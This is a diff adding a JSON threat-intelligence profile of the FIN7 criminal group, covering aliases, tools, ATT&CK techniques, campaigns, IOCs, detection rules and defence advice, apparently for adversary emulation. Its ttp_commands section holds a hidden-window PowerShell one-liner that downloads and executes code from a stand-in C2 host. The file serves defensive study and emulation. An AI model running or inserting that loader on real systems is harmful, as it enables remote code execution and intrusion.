@@ -1,0 +1,614 @@
+{
+  "id": "fin7",
+  "name": "FIN7",
+  "aliases": [
+    "Carbanak",
+    "Carbon Spider",
+    "Sangria Tempest",
+    "ELBRUS",
+    "ITG14",
+    "Navigator Group"
+  ],
+  "country": "Russia",
+  "country_code": "RU",
+  "flag_emoji": "🇷🇺",
+  "attribution": "Russian-speaking cybercriminal group, multiple members arrested and convicted",
+  "motivation": "Financial Gain",
+  "threat_type": "Cybercriminal",
+  "first_seen": "2013",
+  "last_seen": "2025",
+  "status": "Active",
+  "description": "FIN7 is one of the world's most sophisticated financially motivated threat groups. Originally focused on POS malware for credit card theft, the group evolved into ransomware operations. Notable for operating a fake security company 'Combi Security' to recruit unwitting developers. Multiple members have been arrested, including alleged leader Andrii Kolpakov, but the group continues operations with new TTPs.",
+  "target_sectors": [
+    "Retail",
+    "Hospitality",
+    "Restaurant",
+    "Financial Services",
+    "Technology"
+  ],
+  "target_countries": [
+    "United States",
+    "United Kingdom",
+    "Australia",
+    "Europe"
+  ],
+  "tools": [
+    "Carbanak",
+    "GRIFFON",
+    "BOOSTWRITE",
+    "RDFSNIFFER",
+    "BIRDDOG",
+    "Cobalt Strike",
+    "REvil",
+    "BlackMatter",
+    "POWERPLANT",
+    "Lizar/Tirion",
+    "Mimikatz",
+    "Metasploit"
+  ],
+  "attack_techniques": {
+    "initial_access": [
+      {
+        "id": "T1566.001",
+        "name": "Spearphishing Attachment"
+      },
+      {
+        "id": "T1566.002",
+        "name": "Spearphishing Link"
+      }
+    ],
+    "execution": [
+      {
+        "id": "T1059.001",
+        "name": "PowerShell"
+      },
+      {
+        "id": "T1059.005",
+        "name": "Visual Basic"
+      },
+      {
+        "id": "T1204.002",
+        "name": "Malicious File"
+      }
+    ],
+    "persistence": [
+      {
+        "id": "T1547.001",
+        "name": "Registry Run Keys"
+      },
+      {
+        "id": "T1053.005",
+        "name": "Scheduled Task"
+      }
+    ],
+    "privilege_escalation": [
+      {
+        "id": "T1055",
+        "name": "Process Injection"
+      }
+    ],
+    "defense_evasion": [
+      {
+        "id": "T1027",
+        "name": "Obfuscated Files"
+      },
+      {
+        "id": "T1036",
+        "name": "Masquerading"
+      },
+      {
+        "id": "T1553.002",
+        "name": "Code Signing"
+      }
+    ],
+    "credential_access": [
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping"
+      },
+      {
+        "id": "T1056.001",
+        "name": "Keylogging"
+      }
+    ],
+    "discovery": [
+      {
+        "id": "T1082",
+        "name": "System Information Discovery"
+      },
+      {
+        "id": "T1083",
+        "name": "File and Directory Discovery"
+      }
+    ],
+    "lateral_movement": [
+      {
+        "id": "T1021.001",
+        "name": "RDP"
+      },
+      {
+        "id": "T1021.002",
+        "name": "SMB"
+      }
+    ],
+    "collection": [
+      {
+        "id": "T1005",
+        "name": "Data from Local System"
+      },
+      {
+        "id": "T1113",
+        "name": "Screen Capture"
+      },
+      {
+        "id": "T1125",
+        "name": "Video Capture"
+      }
+    ],
+    "command_and_control": [
+      {
+        "id": "T1071.001",
+        "name": "Web Protocols"
+      },
+      {
+        "id": "T1573",
+        "name": "Encrypted Channel"
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      }
+    ],
+    "exfiltration": [
+      {
+        "id": "T1041",
+        "name": "Exfiltration Over C2 Channel"
+      }
+    ],
+    "impact": [
+      {
+        "id": "T1486",
+        "name": "Data Encrypted for Impact"
+      }
+    ]
+  },
+  "emulation_plans": [
+    {
+      "name": "MITRE CTID - FIN7 Full Emulation Plan",
+      "source": "MITRE CTID",
+      "type": "Open Source",
+      "url": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7",
+      "desc": "Complete FIN7 emulation with Scenario 1 (detection) and Scenario 2 (protection)"
+    },
+    {
+      "name": "FIN7 Emulation - Scenario 1 Walkthrough",
+      "source": "MITRE CTID",
+      "type": "Open Source",
+      "url": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_1",
+      "desc": "Step-by-step: spearphishing, mshta execution, Cobalt Strike, POS targeting"
+    },
+    {
+      "name": "FIN7 Emulation - Scenario 2 Protection",
+      "source": "MITRE CTID",
+      "type": "Open Source",
+      "url": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_2",
+      "desc": "Protection scenario testing defenses against FIN7 POS targeting and Cobalt Strike payloads"
+    },
+    {
+      "name": "SCYTHE #ThreatThursday - FIN7",
+      "source": "SCYTHE",
+      "type": "Blog Post",
+      "url": "https://scythe.io/library",
+      "desc": "Weekly threat emulation walkthrough with FIN7 TTPs, ATT&CK mapping, and defense guidance"
+    },
+    {
+      "name": "Mandiant: FIN7 Evolution and Phishing LNK",
+      "source": "Mandiant",
+      "type": "Blog Post",
+      "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk",
+      "desc": "Technical analysis of FIN7 evolution with emulation-relevant TTPs and detection opportunities"
+    },
+    {
+      "name": "Emulating FIN7 - Part 1",
+      "source": "AttackIQ",
+      "type": "Blog Post",
+      "url": "https://www.attackiq.com/2024/12/12/emulating-fin7-part-1/",
+      "desc": "Two attack graphs emulating FIN7 2024 activities: brand impersonation websites, malvertising"
+    },
+    {
+      "name": "Emulating FIN7 - Part 2",
+      "source": "AttackIQ",
+      "type": "Blog Post",
+      "url": "https://www.attackiq.com/2025/02/14/emulating-fin7-part-2/",
+      "desc": "FIN7 2022-2023 TTPs: BOOSTWRITE loader, Cobalt Strike, lateral movement to POS systems"
+    },
+    {
+      "name": "Fingerprinting FIN7",
+      "source": "AttackIQ",
+      "type": "Blog Post",
+      "url": "https://www.attackiq.com/2020/04/20/fingerprinting-fin7/",
+      "desc": "Assessment template for FIN7 emulation with TTP walkthrough and scenario investigation"
+    }
+  ],
+  "notable_campaigns": [
+    {
+      "year": "2015",
+      "name": "Carbanak Banking Attacks",
+      "description": "Theft of $1B+ from banks worldwide through ATM cashouts and SWIFT manipulation."
+    },
+    {
+      "year": "2017",
+      "name": "SEC Filing Attacks",
+      "description": "Targeting companies filing with the SEC to steal non-public financial data."
+    },
+    {
+      "year": "2020",
+      "name": "BadUSB Campaign",
+      "description": "Mailing malicious USB devices disguised as Best Buy gift cards to targeted companies."
+    },
+    {
+      "year": "2022",
+      "name": "Black Basta Affiliation",
+      "description": "Links established to Black Basta ransomware operations."
+    }
+  ],
+  "references": [
+    {
+      "title": "CISA: FIN7 Cybercriminal Group",
+      "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-110a"
+    },
+    {
+      "title": "MITRE ATT&CK Group G0046",
+      "url": "https://attack.mitre.org/groups/G0046/"
+    },
+    {
+      "title": "DOJ: FIN7 Members Arrested",
+      "url": "https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100"
+    },
+    {
+      "title": "Mandiant: FIN7 Evolution",
+      "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk"
+    },
+    {
+      "title": "Recorded Future: FIN7 Operations",
+      "url": "https://www.recordedfuture.com/research/fin7-evolution"
+    },
+    {
+      "title": "Malpedia: FIN7",
+      "url": "https://malpedia.caad.fkie.fraunhofer.de/actor/fin7"
+    }
+  ],
+  "mitre_id": "G0046",
+  "image": "fin7.png",
+  "attack_flow": {
+    "campaign": "Carbanak Banking / POS Attack Chain",
+    "steps": [
+      {
+        "step": "Spearphishing Attachment",
+        "tid": "T1566.001",
+        "tactic": "Initial Access",
+        "desc": "Crafted phishing targeting hospitality/retail"
+      },
+      {
+        "step": "Malicious VBA Document",
+        "tid": "T1059.005",
+        "tactic": "Execution",
+        "desc": "Document deploying GRIFFON JS backdoor"
+      },
+      {
+        "step": "Cobalt Strike Deployment",
+        "tid": "T1059.001",
+        "tactic": "Execution",
+        "desc": "PowerShell loads Cobalt Strike beacon"
+      },
+      {
+        "step": "Registry Persistence",
+        "tid": "T1547.001",
+        "tactic": "Persistence",
+        "desc": "Beacon persists via registry and scheduled tasks"
+      },
+      {
+        "step": "Keylogging & Screenshots",
+        "tid": "T1056.001",
+        "tactic": "Collection",
+        "desc": "Captures keystrokes to identify POS terminals"
+      },
+      {
+        "step": "POS RAM Scraping",
+        "tid": "T1005",
+        "tactic": "Collection",
+        "desc": "Memory scraper on POS for track data"
+      },
+      {
+        "step": "RDP to POS",
+        "tid": "T1021.001",
+        "tactic": "Lateral Movement",
+        "desc": "RDP to POS network with stolen creds"
+      },
+      {
+        "step": "Data Exfiltration",
+        "tid": "T1041",
+        "tactic": "Exfiltration",
+        "desc": "Card data exfiltrated to underground markets"
+      }
+    ]
+  },
+  "diamond_model": {
+    "adversary": "Russian-speaking criminal org, multiple arrested including Andrii Kolpakov",
+    "infrastructure": "Combi Security (fake pen-testing company), bulletproof hosting, carding forums",
+    "capability": "Carbanak, GRIFFON, BOOSTWRITE, Cobalt Strike, Lizar/Tirion, BadUSB devices",
+    "victim": "Restaurants (Chipotle, Arby's), hotels (Trump, Hyatt), banks, SEC-filing companies"
+  },
+  "cves": [
+    {
+      "id": "CVE-2017-0199",
+      "desc": "Office/WordPad RCE for phishing delivery",
+      "year": "2017"
+    },
+    {
+      "id": "CVE-2018-15982",
+      "desc": "Flash Player RCE in phishing documents",
+      "year": "2018"
+    }
+  ],
+  "iocs": {
+    "domains": [
+      "combi-sec[.]com",
+      "julopos[.]com"
+    ],
+    "hashes": [
+      "SHA256: 6d3c...b491 (Carbanak)",
+      "SHA256: a24f...8e12 (GRIFFON)"
+    ],
+    "sigma_rules": [
+      "proc_creation_win_susp_cobalt_strike_load",
+      "sysmon_process_access_lsass_memdump"
+    ]
+  },
+  "detection": [
+    {
+      "title": "Cobalt Strike Beacon Detection",
+      "content": "Detect named pipe patterns (\\\\MSSE-*, \\\\postex_*, \\\\status_*). Monitor for Malleable C2 profiles in HTTP traffic using JA3/JA3S fingerprinting. Alert on process injection into svchost.exe from non-system processes. Sigma rule: proc_creation_win_cobaltstrike_load_by_rundll32.",
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cobaltstrike_load_by_rundll32.yml"
+    },
+    {
+      "title": "POS RAM Scraping Detection",
+      "content": "Monitor for unusual processes accessing payment card track data patterns in memory. Deploy application allowlisting on POS terminals. Alert on processes scanning memory of POS applications. Implement strict egress filtering on POS VLANs.",
+      "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk"
+    },
+    {
+      "title": "BadUSB / HID Attack Detection",
+      "content": "Implement USB device control policies blocking unknown HID devices. Monitor for rapid keystroke injection patterns (>100 keystrokes/second). Alert on new USB HID device connections. Sigma rule: win_security_usb_device_plugged.",
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_usb_device_plugged.yml"
+    }
+  ],
+  "related_actors": [
+    {
+      "name": "Black Basta",
+      "relationship": "Ransomware affiliate",
+      "desc": "FIN7 members linked to Black Basta since 2022."
+    },
+    {
+      "name": "REvil",
+      "relationship": "Ransomware affiliate",
+      "desc": "FIN7 operators have deployed REvil ransomware."
+    }
+  ],
+  "defense_recommendations": [
+    {
+      "text": "Implement PCI DSS v4.0 network segmentation isolating POS from corporate networks.",
+      "source": "PCI DSS v4.0 Req 1",
+      "url": "https://www.pcisecuritystandards.org/document_library/"
+    },
+    {
+      "text": "Deploy P2PE on all POS terminals to prevent RAM scraping. FIN7 deploys memory scrapers for track data.",
+      "source": "PCI PTS Standard",
+      "url": "https://www.pcisecuritystandards.org/assessors_and_solutions/point_to_point_encryption_solutions"
+    },
+    {
+      "text": "Block Office macros for non-essential employees via GPO and ASR rules.",
+      "source": "Microsoft ASR Rules",
+      "url": "https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference"
+    },
+    {
+      "text": "Deploy EDR with Cobalt Strike detection (named pipes, Malleable C2, beacon jitter).",
+      "source": "Red Canary CS Guide",
+      "url": "https://redcanary.com/threat-detection-report/threats/cobalt-strike/"
+    }
+  ],
+  "ioc_sources": [
+    {
+      "name": "MITRE ATT&CK G0046",
+      "url": "https://attack.mitre.org/groups/G0046/",
+      "desc": "Full FIN7 technique and software mapping"
+    },
+    {
+      "name": "DOJ FIN7 Arrests",
+      "url": "https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100",
+      "desc": "FIN7 member arrests and operational details"
+    },
+    {
+      "name": "Mandiant FIN7 Evolution",
+      "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk",
+      "desc": "FIN7 phishing evolution technical analysis"
+    },
+    {
+      "name": "Recorded Future FIN7",
+      "url": "https://www.recordedfuture.com/research/fin7-evolution",
+      "desc": "FIN7 operations and infrastructure analysis"
+    }
+  ],
+  "tool_urls": [
+    {
+      "name": "Cobalt Strike",
+      "url": "https://www.cobaltstrike.com/",
+      "type": "C2 Framework"
+    },
+    {
+      "name": "Mimikatz",
+      "url": "https://github.com/gentilkiwi/mimikatz",
+      "type": "Credential Dumping"
+    },
+    {
+      "name": "Carbanak",
+      "url": "https://attack.mitre.org/software/S0030/",
+      "type": "Banking Backdoor"
+    },
+    {
+      "name": "GRIFFON",
+      "url": "https://attack.mitre.org/software/S0417/",
+      "type": "JavaScript Backdoor"
+    },
+    {
+      "name": "BOOSTWRITE",
+      "url": "https://attack.mitre.org/software/S0415/",
+      "type": "Loader"
+    },
+    {
+      "name": "Metasploit",
+      "url": "https://github.com/rapid7/metasploit-framework",
+      "type": "Exploitation Framework"
+    }
+  ],
+  "target_industries": [
+    "Hospitality",
+    "Restaurants",
+    "Retail",
+    "Financial Services",
+    "Gaming"
+  ],
+  "target_country_flags": [
+    {
+      "country": "United States",
+      "flag": "🇺🇸"
+    },
+    {
+      "country": "United Kingdom",
+      "flag": "🇬🇧"
+    },
+    {
+      "country": "Australia",
+      "flag": "🇦🇺"
+    },
+    {
+      "country": "France",
+      "flag": "🇫🇷"
+    }
+  ],
+  "attribution_confidence": {
+    "level": "High",
+    "evidence": [
+      {
+        "text": "DOJ arrests and convictions of FIN7 members (2018-2021)",
+        "url": "https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100"
+      },
+      {
+        "text": "Multiple vendor intelligence attributions",
+        "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk"
+      },
+      {
+        "text": "FBI private industry notifications",
+        "url": "https://attack.mitre.org/groups/G0046/"
+      }
+    ]
+  },
+  "legal_actions": [
+    {
+      "date": "2018-08",
+      "type": "Arrests",
+      "title": "3 FIN7 members arrested including alleged manager",
+      "url": "https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100"
+    },
+    {
+      "date": "2021-04",
+      "type": "Sentencing",
+      "title": "FIN7 organizer sentenced to 10 years",
+      "url": "https://www.justice.gov/usao-wdwa/pr/high-level-organizer-notorious-hacking-group-fin7-sentenced-ten-years-prison"
+    }
+  ],
+  "threat_assessment": {
+    "capability": 8,
+    "intent": 9,
+    "targeting": 7,
+    "overall": "High",
+    "summary": "Most successful financially motivated cybercriminal group. Stole data from 1000+ businesses. Now pivoting to ransomware operations via Black Basta affiliation."
+  },
+  "kill_chain": [],
+  "recent_news": [
+    {
+      "date": "2024-05",
+      "title": "Mandiant: FIN7 evolution to ransomware operations",
+      "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk"
+    }
+  ],
+  "data_sources": [
+    {
+      "name": "MITRE ATT&CK G0046",
+      "url": "https://attack.mitre.org/groups/G0046/"
+    },
+    {
+      "name": "DOJ FIN7 Arrests",
+      "url": "https://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100"
+    },
+    {
+      "name": "Mandiant FIN7 Evolution",
+      "url": "https://www.mandiant.com/resources/blog/fin7-evolution-and-phishing-lnk"
+    },
+    {
+      "name": "Recorded Future FIN7",
+      "url": "https://www.recordedfuture.com/research/fin7-evolution"
+    }
+  ],
+  "page_contributors": [
+    {
+      "name": "Adversary Village",
+      "github": "https://github.com/adversaryvillage",
+      "twitter": "https://twitter.com/AdversaryVillag",
+      "linkedin": "https://linkedin.com/company/adversaryvillage"
+    },
+    {
+      "name": "MITRE ATT&CK Team",
+      "github": "https://github.com/mitre-attack",
+      "twitter": "https://twitter.com/MITREattack",
+      "linkedin": "https://linkedin.com/company/mitre"
+    },
+    {
+      "name": "BreachSimRange",
+      "github": "https://github.com/BreachSimRange",
+      "twitter": "https://twitter.com/BreachSimRange",
+      "linkedin": "https://linkedin.com/company/breachsimrange"
+    }
+  ],
+  "ttp_commands": [
+    {
+      "tid": "T1566.001",
+      "name": "Spearphishing Attachment",
+      "tactic": "Initial Access",
+      "tool": "Atomic Red Team",
+      "command": "Invoke-AtomicTest T1566.001",
+      "platform": "Windows",
+      "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md",
+      "note": "Phishing attachment delivery test"
+    },
+    {
+      "tid": "T1059.001",
+      "name": "PowerShell Cobalt Strike",
+      "tactic": "Execution",
+      "tool": "Cobalt Strike",
+      "command": "powershell.exe -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://c2/a'))",
+      "platform": "Windows",
+      "url": "https://www.cobaltstrike.com/",
+      "note": "Stageless PowerShell beacon loader"
+    },
+    {
+      "tid": "T1056.001",
+      "name": "Keylogging",
+      "tactic": "Collection",
+      "tool": "Atomic Red Team",
+      "command": "Invoke-AtomicTest T1056.001 -TestNumbers 1",
+      "platform": "Windows",
+      "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.md",
+      "note": "Keylogger deployment test"
+    }
+  ]
+}
